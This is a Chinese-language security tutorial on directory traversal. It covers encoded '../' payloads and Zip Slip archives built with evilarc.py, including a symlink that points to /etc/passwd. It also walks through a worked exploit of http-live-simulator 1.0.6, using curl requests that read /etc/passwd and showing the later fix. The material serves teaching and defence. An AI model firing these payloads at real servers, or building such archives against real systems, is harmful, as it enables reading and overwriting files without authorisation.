### 简介

* 漏洞名称:目录穿越(Directory traversal)  路径穿越(Path traversal)
* 漏洞原理:攻击者通过可控的输入，通过"参数值"、"构造的符号链接文件"、"构造的压缩文件"等形式，将构造的"路径"传递给后端逻辑，实现路径穿越。
* 漏洞危害:任意文件读取、写入、删除、覆盖、修改...
* 漏洞案例: [CVE - directory traversal](https://www.cvedetails.com/vulnerability-list/opdirt-1/directory-traversal.html)

### 基础知识

系统相关

| |root directory|directory separator|
|:-------------:|--|-----|
|Unix-like OS|`/`|`/`|
|Windows|`<drive letter>:\`|`\` or `/`|


Unix-like OS(macOS下实际测试)
```
上级目录
../

当前目录
./

查看上级目录下的1.txt的命令有很多(因为./表示当前目录 加多个也不影响 没作用)
直接查看
cat ../1.txt

在跨目录之后使用./
cat .././1.txt
cat ../././1.txt

在跨目录之前使用./
cat ./../1.txt
cat ././../1.txt

在跨目录之前之后都使用./
cat ./.././1.txt
cat ././../././1.txt
```

### 测试方法

Encoding and double encoding:

```
%2e%2e%2f represents ../
%2e%2e/ represents ../
..%2f represents ../ 
%2e%2e%5c represents ..\
%2e%2e\ represents ..\ 
..%5c represents ..\ 
%252e%252e%255c represents ..\ 
..%255c represents ..\
```

URL encoding

Web容器对form和URL中的"百分比编码"执行一级解码(one level of decoding)
```
..%c0%af represents ../ 
..%c1%9c represents ..\ 
```

### 实例1 - Zip Slip系列漏洞

#### 原理

[参考](https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT)可知 文件名可带相对路径(而不能带绝对路径 根路径)

```
       4.4.17.1 The name of the file, with optional relative path.
       The path stored MUST NOT contain a drive or
       device letter, or a leading slash.  All slashes
       MUST be forward slashes '/' as opposed to
       backwards slashes '\' for compatibility with Amiga
       and UNIX file systems etc.  If input came from standard
       input, there is no file name field.  
```

由此实现

构造压缩文件 -> 解压该压缩文件(archive extraction) -> 目录穿越导致任意文件写入(Arbitrary File Write) -> 远程命令执行

压缩文件类型 理论上包括`tar`, `jar`, `war`, `cpio`, `apk`, `rar`, `7z`...

#### 构造压缩文件的过程 - tar文件

构造特殊的压缩文件：因为常规zip软件不会允许待压缩文件 带有字符串`../`的文件名 所以使用对应标准库来创建

如 [evilarc/evilarc.py](https://github.com/ptoomey3/evilarc/blob/master/evilarc.py)

```
# 构造压缩文件
# testfile为解压后的文件
# --depth指定有几个../
# --os 为win时即指定路径分割符为反斜杠\ 为其他字符时则为正斜杠/
# --output-file指定文件名和后缀 支持的后缀有
# --path指定穿越后的目录

# 打开1.tar(无则新建) 添加3个文件 testfile 222 111
python evilarc.py testfile --os=unix --depth=1 --output-file=1.tar --path=admin/manage
python evilarc.py testfile 222  --os=unix --depth=2 --output-file=1.tar -p admin/Bdir
python evilarc.py testfile 111  --os=unix --depth=0 --output-file=1.tar
```


查看压缩文件详情

```
# 查看压缩文件详情的命令
7z l 1.tar
```

```
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=utf8,Utf16=on,HugeFiles=on,64 bits,8 CPUs x64)

Scanning the drive for archives:
1 file, 10240 bytes (10 KiB)

Listing archive: 1.tar

--
Path = 1.tar
Type = tar
Physical Size = 10240
Headers Size = 7680
Code Page = UTF-8

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2019-05-12 12:39:36 .....            7          512  ../admin/manage/testfile
2019-01-13 17:40:49 .....          686         1024  ../../admin/Bdir/222
2019-01-12 19:19:22 .....          726         1024  111
------------------- ----- ------------ ------------  ------------------------
2019-05-12 12:39:36               1419         2560  3 files
```

解压

(bsdtar 2.8.3 - libarchive 2.8.3)

用mac自带的tar进行解压 `tar -xvf 1.tar` 结果显示如下

```
x ../admin/manage/testfile: Path contains '..'
x ../../admin/Bdir/222: Path contains '..'
x 111
tar: Error exit delayed from previous errors.
```

实际文件111是解压成功的，其他两个文件因为文件名包含了`..`而解压失败.


#### 构造压缩文件的过程 - zip文件解压symlinks文件实现目录穿越

创建一个符号链接文件(symlinks)

`ln -s ../etc/passwd pass`

文件名`pass`

文件大小`19 bytes`


构造zip压缩包 将该文件压缩
```
python evilarc.py pass --os=unix --depth=0 --output-file=1.zip
```

解压
```
unzip 1.zip
```

解压过程无任何报错 提取出了一个文件

文件名:`pass`

大小:`7kb`

内容与`etc/passwd`完全相同

成功.


* 测试总结-解压symlinks文件得到其指向的真实文件
  * zip 成功 解压得到symlinks文件指向的真实文件
  * tar 失败 解压得到symlinks文件自身
  * 其他暂未测试

#### Zip Slip漏洞列表


CVE-2017-5946 [Rubyzip Directory traversal vulnerability](https://github.com/rubyzip/rubyzip/issues/315)

修复 [diff](https://github.com/rubyzip/rubyzip/commit/ce4208fdecc2ad079b05d3c49d70fe6ed1d07016)


### 实例2 - 单次替换

代码仓库

[http-live-simulator@1.0.6](https://github.com/prahladyeri/http-live-simulator/tree/8e85a1be562248d0d616c0e5092a3d71bbf5fe5f)

环境搭建
```
# macOS 10.14.4
cd /Users/xxx/Downloads

# Install the module
npm install -g http-live-simulator@1.0.6

# Run the server
http-live
```

漏洞利用
```
# Attempt to access a file from outside that project's directory
# 其中curl的参数--path-as-is 表示"Do not squash .. sequences in URL path" 不压缩url路径中的..

# 构造payload如下 都成功了

# payload1  将 `/../` 替换为 `//../../`
curl --path-as-is http://localhost:8080//../../../../etc/passwd
# 最终绝对路径为/Users/xxx/Downloads/../../../etc/passwd

# payload2  将 `/../` 替换为 `/./.././`
curl --path-as-is http://localhost:8080/./../././../././../././.././etc/passwd
# 最终绝对路径为/Users/xxx/Downloads/.././../././../././.././etc/passwd
# 为了便于理解 可以自行去除其中无实际作用的./ 得到与绕过方式1相同的最终绝对路径 /Users/xxx/Downloads/../../../../etc/passwd
```

payload1绕过过程分析 查看文件bin/http-live可知后端逻辑如下
```
# 71行 var pathname = url.parse(req.url, true).pathname;
# 直接从url中获取pathname的参数值 得到 //../../../../etc/passwd
# 72行 pathname = pathname.replace("/../","");  将参数值中的`/../` 替换为空 仅替换一次(修复无效 可被绕过).
# 此时 pathname参数值变为 /../../../etc/passwd
# 90行 拼接得到绝对路径 abspath = process.cwd() + pathname; #注意 process.cwd()返回当前目录/Users/xxx/Downloads 注意结尾不是斜杠符号
# 92行 此时绝对路径abspath值为 /Users/xxx/Downloads/../../../etc/passwd
# （所以构造payload时url中8000后面必须有两个连续的/才对 否则路径构造错误 文件不存在 跳出 返回404）
# 93行 if (fs.existsSync(abspath)) {  // 路径正确 文件存在	
# 94行 fs.readFile(abspath, function(err, data) { // 将绝对路径实参 abspath 传入到fs.readFile函数
# 98行 res.write(data); //将文件内容作为response body
# 99行 res.end(); //返回响应
# 实现了任意文件读取.
```


可见1.0.7 的修复

diff: https://github.com/prahladyeri/http-live-simulator/commit/354644525f1626c5921abac10913c0d47f1f1433

关键代码在`bin/http-live`中的72-74行 是将参数值中的`/../`替换为空 循环替换 直到不存在`/../`为止 如下
```
while(pathname.indexOf("/../") != -1) {
		pathname = pathname.replace("/../",""); //fix for path traversal bug
	}
```

---

为什么不用`\`测试？
因为node库中 url.parse函数 会把\转换为/ 参考node自带库中url.parse的定义 https://github.com/nodejs/node/blob/master/lib/url.js


#### 总结 - node自带的fs模块的readFile函数


1.读取普通文件(files)
```
# 读取普通文件 将文件内容转化为文本 输出
var mypath = "/Users/xxx/Downloads/../../../etc/passwd";fs.readFile(mypath,function(err,data){console.log(data.toString())})
```

2.读取符号链接文件(symlinks)

创建符号链接文件 `ln -s ../1.txt symfile`
```
# 读取一个名为symfile的符号链接文件 实际上可以读取到规定目录之外的文件 从而得到1.txt的内容
# 但这通常只被认为是预期行为(expected behavior)，除非存在确实能够影响的攻击场景 如可以上传指定的symlinks
var mypath = "/Users/xxx/Downloads/symfile";fs.readFile(mypath,function(err,data){console.log(data.toString())})
```
